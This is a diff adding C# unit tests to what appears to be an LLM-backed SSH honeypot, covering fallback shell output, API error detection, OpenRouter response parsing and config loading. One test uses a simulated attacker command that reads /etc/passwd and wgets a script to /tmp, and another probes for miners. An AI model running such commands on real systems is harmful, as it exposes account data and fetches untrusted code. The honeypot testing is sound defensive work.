@@ -330,6 +330,84 @@ public class CommandResolverTests
     {
         Assert.Equal("up 47 days, 3 hours, 22 minutes", CommandResolver.FormatUptime(new[] { "-p" }));
     }
+
+    [Theory]
+    [InlineData("(Empty response)")]
+    [InlineData("No output")]
+    [InlineData("No output.")]
+    public void NormalizeTerminalOutput_TreatsEmptyOutputMarkersAsNoOutput(string response)
+    {
+        Assert.Equal("", Program.NormalizeTerminalOutput(response));
+    }
+
+    [Fact]
+    public void IsModelFailureResponse_DetectsApiAndNetworkErrors()
+    {
+        Assert.True(CommandResolver.IsModelFailureResponse("[api error] 401: missing key"));
+        Assert.True(CommandResolver.IsModelFailureResponse("[network error] timeout"));
+        Assert.False(CommandResolver.IsModelFailureResponse("bash: nope: command not found"));
+    }
+
+    [Fact]
+    public void GenerateLocalFallbackResponse_ReturnsShellOutputForCompoundCommands()
+    {
+        var response = CommandResolver.GenerateLocalFallbackResponse("cat /etc/passwd | grep root; wget http://example.com/a.sh -O /tmp/a.sh");
+
+        Assert.Contains("root:x:0:0:root:/root:/bin/bash", response);
+        Assert.DoesNotContain("api error", response, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("network error", response, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Fact]
+    public void StaticResponses_AreValidJsonLines()
+    {
+        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../FunnyPot/data/ssh_responses.jsonl"));
+
+        foreach (var line in File.ReadLines(path).Where(line => !string.IsNullOrWhiteSpace(line)))
+        {
+            using var _ = System.Text.Json.JsonDocument.Parse(line);
+        }
+    }
+
+    [Fact]
+    public void StaticResponses_DoNotCaptureUnhandledDynamicCommandVariants()
+    {
+        Assert.NotNull(StaticResponseStore.GetResponse("ps", "/root"));
+        Assert.Null(StaticResponseStore.GetResponse("ps | grep '[Mm]iner'", "/root"));
+    }
+
+    [Fact]
+    public void BuildApiUrl_JoinsBaseAndEndpoint()
+    {
+        Assert.Equal("https://openrouter.ai/api/v1/chat/completions", Program.BuildApiUrl("https://openrouter.ai/api/v1/", "/chat/completions"));
+    }
+
+    [Fact]
+    public void TryParseOpenRouterResponse_ExtractsContentAndUsage()
+    {
+        using var doc = System.Text.Json.JsonDocument.Parse("""
+            {
+              "choices": [{ "message": { "content": "ok" } }],
+              "usage": { "prompt_tokens": 10, "completion_tokens": 2, "total_tokens": 12 }
+            }
+            """);
+
+        var parsed = Program.TryParseOpenRouterResponse(doc.RootElement, out var content, out var promptTokens, out var completionTokens, out var totalTokens);
+
+        Assert.True(parsed);
+        Assert.Equal("ok", content);
+        Assert.Equal(10, promptTokens);
+        Assert.Equal(2, completionTokens);
+        Assert.Equal(12, totalTokens);
+    }
+
+    [Fact]
+    public void TryParseOpenRouterResponse_RejectsMissingChoices()
+    {
+        using var doc = System.Text.Json.JsonDocument.Parse("{\"error\":{\"message\":\"bad\"}}");
+
+        Assert.False(Program.TryParseOpenRouterResponse(doc.RootElement, out _, out _, out _, out _));
+    }
 }
 
 public class AppConfigurationTests
@@ -362,6 +440,18 @@ public class AppConfigurationTests
         {
             File.Delete(tempPath);
         }
+    }
+
+    [Fact]
+    public void Load_ProjectConfig_BindsRootSections()
+    {
+        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../config/app-config.yaml"));
+
+        var config = AppConfiguration.Load(path);
+
+        Assert.Equal("mistralai/mistral-nemo", config.Llm.Model);
+        Assert.Equal("/var/log/funnypot", config.Logging.LogDir);
+        Assert.False(config.Notification.Enabled);
     }
 }
 
